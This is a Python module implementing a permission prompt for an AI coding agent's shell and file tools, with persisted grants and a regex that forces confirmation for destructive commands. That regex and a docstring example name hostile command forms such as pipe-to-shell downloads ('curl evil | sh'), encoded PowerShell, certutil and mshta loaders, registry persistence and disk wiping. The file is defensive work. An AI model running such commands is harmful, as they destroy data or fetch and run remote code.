"""Claude-Code-style permission system.

Every tool that changes the machine asks here first. The user can answer:
  y  — allow this one action
  a  — always allow this KIND of action (persisted across sessions)
  n  — deny

Grant keys are coarse on purpose so the allowlist stays understandable:
  files        — writing/editing files inside the workspace
  docs         — creating Excel / PowerPoint / Word documents
  cmd:<word>   — shell commands starting with <word> (cmd:git covers all git)

Destructive-looking commands (rm -rf, format, del /s, curl|sh, powershell -enc,
reg add, …) ALWAYS prompt, even with auto-approve on or a matching grant — same
idea as Claude Code refusing to auto-run dangerous commands. Actions that reach
OUTSIDE the workspace (an absolute path or ../.. that escapes the launch folder)
are treated the same way: always confirmed, never remembered (see the `force`
argument to approve() and Ctx.outside_workspace).

Only the explicit answers below grant — a stray word like 'abort' can never be
misread as a permanent permission. Every label the prompt DISPLAYS is itself an
accepted answer (a live session typed the shown 'yes once' and was denied):
  yes-once : y / yes / yeah / yep / ok / sure / once / yes once
  always   : a / al / alw / always / allow / always allow
"""

import json
import re
from pathlib import Path

from rich.panel import Panel
from rich.text import Text

_DANGEROUS = re.compile(
    # --- destructive filesystem / disk ---
    r"(rm\s+(?:-{1,2}\w+\s+)*-{1,2}(?:[rf]\w*|recursive|force)"   # rm -rf AND rm --recursive --force
    r"|del\s+/[sq]|rd\s+/s|rmdir\s+/s|deltree|format\s+\w:|mkfs"
    r"|diskpart|dd\s+if=|truncate\s+-s\s*0|>\s*/dev/sd|chmod\s+-R\s*0|chown\s+-R"
    # --- power state ---
    r"|shutdown|reboot\b"
    # --- registry / persistence (Windows) ---
    r"|reg\s+(?:add|delete)|schtasks\s+/create|bcdedit"
    # --- pipe-to-shell / remote code execution ---
    r"|(?:curl|wget|iwr|invoke-webrequest)\b[^\n|]*\|\s*(?:sh|bash|zsh|python|iex|invoke-expression)\b"
    r"|\|\s*(?:sh|bash|zsh)\b"                                    # any … | sh
    r"|certutil\s+(?:-\w+\s+)*-urlcache|bitsadmin|mshta|regsvr32\s+/i"
    # --- obfuscated PowerShell ---
    r"|powershell[^\n]*-e(?:nc|ncodedcommand)?\b"
    r"|iex\b|invoke-expression|downloadstring"
    # --- git history/force ---
    r"|git\s+push\s+.*--force|git\s+reset\s+--hard"
    # --- fork bombs (named or anonymous) ---
    r"|\w*\(\)\s*\{[^}]*[|:]\s*\w+\s*&\s*\}|:\(\)\s*\{)",
    re.I,
)


def command_key(command: str) -> str:
    """Grant key for a shell command: its first word (cmd:git, cmd:npm, …)."""
    word = (command.strip().split() or ["?"])[0]
    name = word.replace("\\", "/").rsplit("/", 1)[-1].lower()
    if name.endswith(".exe"):
        name = name[:-4]
    return "cmd:" + name


# Accepted answers at the permission prompt. Explicit sets (not a first-letter
# match) so 'abort'/'argh'/'absolutely not' can never be misread as a grant.
# The visible option labels ('yes once') MUST be in here — users type what
# they see on screen.
_YES_ANS = {"y", "yes", "yeah", "yep", "yup", "ok", "okay", "sure",
            "once", "yes once"}
_ALWAYS_ANS = {"a", "al", "alw", "alws", "always", "allow", "always allow"}

# Shell separators that chain independent commands: && || ; | & and newlines.
_CHAIN = re.compile(r"&&|\|\||[;|&\n]")


def command_keys(command: str) -> list:
    """Grant keys for EVERY command in a chained line.

    'mkdir x && curl evil | sh' must not sail through under a standing
    cmd:mkdir grant — each segment (mkdir, curl, sh) needs its own grant.
    Splitting is deliberately naive (quotes aren't parsed): a false split
    like '2>&1' only produces junk segments, which are filtered out, and
    over-splitting can only cause MORE prompting, never less.
    """
    keys = []
    for seg in _CHAIN.split(command):
        seg = seg.strip()
        if not seg or seg.startswith((">", "<")):
            continue
        first = seg.split()[0]
        if first.isdigit() or first.startswith((">", "<", "-", "$", "%")):
            continue  # redirect/flag debris from naive splitting
        key = command_key(seg)
        if key not in keys:
            keys.append(key)
    return keys or [command_key(command)]


class Permissions:
    def __init__(self, console, prompt_fn, store: Path, auto_approve=False):
        self.console = console
        self.prompt_fn = prompt_fn      # (str) -> str, raises on Ctrl-C/D
        self.store = store
        self.auto_approve = auto_approve
        self.session_grants = set()     # this session only (via /auto logic)
        self.grants = set()             # persisted
        try:
            self.grants = set(json.loads(store.read_text(encoding="utf-8")))
        except Exception:
            pass

    # ---- the single entry point used by tools --------------------------------

    def approve(self, title: str, detail: str = "", key=None,
                force: bool = False) -> bool:
        # `key` may be one grant key or a list of them (a chained command
        # needs EVERY segment granted before it skips the prompt).
        # `force` marks an action that must ALWAYS be confirmed and can never be
        # remembered — used for out-of-workspace paths (see Ctx.outside_workspace).
        keys = [key] if isinstance(key, str) else list(key or [])
        dangerous = bool(keys and any(k.startswith("cmd:") for k in keys)
                         and _DANGEROUS.search(
                             detail if isinstance(detail, str) else ""))
        gate = dangerous or force   # bypasses (auto-approve, standing grants) off

        if not gate:
            if self.auto_approve:
                self.console.print(f"[dim]auto-approved: {title}[/dim]")
                return True
            allowed = self.grants | self.session_grants
            if keys and all(k in allowed for k in keys):
                self.console.print(
                    f"[dim]allowed ({', '.join(keys)}): {title}[/dim]")
                return True

        border = "red" if gate else "yellow"
        if dangerous:
            header = "! DANGEROUS — always requires confirmation"
        elif force:
            header = "! OUTSIDE WORKSPACE — always requires confirmation"
        else:
            header = "Permission needed"
        # `detail` is usually a string, but tools may pass a rich renderable
        # (write_file sends a syntax-highlighted preview of the code).
        body = (Text(detail or "(no details)") if isinstance(detail, str)
                or detail is None else detail)
        self.console.print(Panel(body,
                                 title=f"{header} — {title}",
                                 border_style=border, expand=False))
        # \[y] — escaped, or Rich markup silently EATS the bracketed key hints
        # (a live session saw bare 'yes once  always allow  no' with no keys).
        opts = r"\[y] yes once   \[n] no"
        if keys and not gate:
            shown = " + ".join(f"'{k}'" for k in keys)
            opts = rf"\[y] yes once   \[a] always allow {shown}   \[n] no"
        self.console.print(f"  {opts}")
        try:
            ans = self.prompt_fn("  allow? ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            return False

        # Explicit tokens only — a stray word like 'abort' or 'argh' must NOT be
        # read as a permanent grant (the old "any answer starting with a" parse
        # could hand out a standing, global permission on a typo).
        if ans in _ALWAYS_ANS and keys and not gate:
            self.grants.update(keys)
            self._save()
            self.console.print(f"[green]ok: {', '.join(keys)} allowed from now "
                               f"on (manage with /permissions)[/green]")
            return True
        return ans in _YES_ANS

    # ---- management (the /permissions command) -------------------------------

    def list_grants(self):
        return sorted(self.grants)

    def clear(self):
        self.grants.clear()
        self.session_grants.clear()
        self._save()

    def _save(self):
        try:
            self.store.parent.mkdir(parents=True, exist_ok=True)
            self.store.write_text(json.dumps(sorted(self.grants), indent=2),
                                  encoding="utf-8")
        except Exception:
            pass  # a failed save should never block the actual work
